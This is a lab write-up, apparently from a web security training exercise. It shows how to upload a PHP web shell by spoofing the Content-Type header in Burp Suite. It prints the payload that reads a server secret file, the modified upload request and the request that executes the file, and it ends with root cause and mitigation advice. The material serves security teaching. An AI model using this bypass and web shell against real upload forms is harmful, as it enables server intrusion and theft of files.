# Lab: Web shell upload via Content-Type restriction bypass

## Overview
This lab demonstrates a file upload vulnerability where the application validates uploads using the `Content-Type` header instead of properly checking the actual file extension or file contents.

By intercepting the request in Burp Suite and modifying the MIME type, it is possible to upload a malicious PHP file and achieve Remote Code Execution (RCE).

---

## Objective
Upload a malicious PHP web shell by bypassing file type restrictions and retrieve the secret stored on the server.

---

## Tools Used
- Burp Suite Community Edition
- Firefox Browser
- Kali Linux
- PHP Web Shell

---

## Vulnerability Explanation

The application attempts to restrict uploads to image files only.

When a normal PHP file is uploaded, the server blocks it with the error:

```text
Sorry, file type application/x-php is not allowed
Only image/jpeg and image/png are allowed
```

However, the validation relies only on the `Content-Type` header sent by the client.

An attacker can intercept the request and change:

```http
Content-Type: application/x-php
```

to:

```http
Content-Type: image/png
```

The server accepts the upload even though the file still contains executable PHP code.

---

# PHP Payload Used

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

This payload reads the secret file from the server and prints it in the response.

---

# Steps to Reproduce

## 1. Open the Lab
Login to the lab environment and navigate to the avatar upload section.

---

## 2. Create Malicious PHP File

Create a file named:

```bash
temp.php
```

Add the following payload:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

---

## 3. Attempt Normal Upload

Upload the file normally.

The server rejects the upload with the following error:

```text
Sorry, file type application/x-php is not allowed
Only image/jpeg and image/png are allowed
```

### Screenshot

![Upload Rejected](error-message-indicating-only-image-files-can-be-uploaded.png)

---

## 4. Intercept Request Using Burp Suite

Turn on Burp Proxy interception and upload the file again.

Send the request to **Repeater**.

Locate this line:

```http
Content-Type: application/x-php
```

Modify it to:

```http
Content-Type: image/png
```

The request now appears as:

```http
Content-Disposition: form-data; name="avatar"; filename="temp.php"
Content-Type: image/png
```

### Screenshot

![Modified Upload Request](modified-php-file-upload-request-and-its-response.png)

---

## 5. Send Modified Request

Click **Send** in Burp Repeater.

The server now accepts the upload successfully.

Response:

```text
The file avatars/temp.php has been uploaded.
```

---

## 6. Locate Uploaded File

Open:

```http
/files/avatars/temp.php
```

The server executes the PHP payload.

### Screenshot

![Executed PHP File](corresponding-preview-loaded-response.png)

---

## 7. Retrieve Secret

The response displays the secret value stored on the server.

Example:

```text
63VebfbWquPOPBSNp8SFKIS9RgyTOHbX
```

This confirms successful Remote Code Execution.

---

# Proof of Concept

## Malicious File

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

---

## Modified Request

```http
POST /my-account/avatar HTTP/2

Content-Disposition: form-data; name="avatar"; filename="temp.php"
Content-Type: image/png
```

---

## Executed File Request

```http
GET /files/avatars/temp.php HTTP/2
```

---

## Response

```text
63VebfbWquPOPBSNp8SFKIS9RgyTOHbX
```

---

# Impact

- Remote Code Execution (RCE)
- Arbitrary file read
- Web shell upload
- Full server compromise
- Potential privilege escalation
- Malware deployment

---

# Root Cause

The application trusts the client-supplied MIME type instead of validating:

- Actual file extension
- File signatures (magic bytes)
- Server-side content inspection

Because of this, attackers can spoof allowed MIME types.

---

# Mitigation

- Validate file extensions server-side
- Validate file signatures/magic bytes
- Reject executable extensions (`.php`, `.jsp`, `.asp`)
- Store uploads outside the web root
- Rename uploaded files
- Disable script execution in upload directories
- Use allowlists for accepted formats

---

# Key Learnings

- Learned how MIME-type validation bypass works
- Understood why client-side validation is insecure
- Practiced modifying requests using Burp Suite
- Learned how uploaded PHP files lead to RCE
- Gained hands-on experience exploiting insecure file uploads
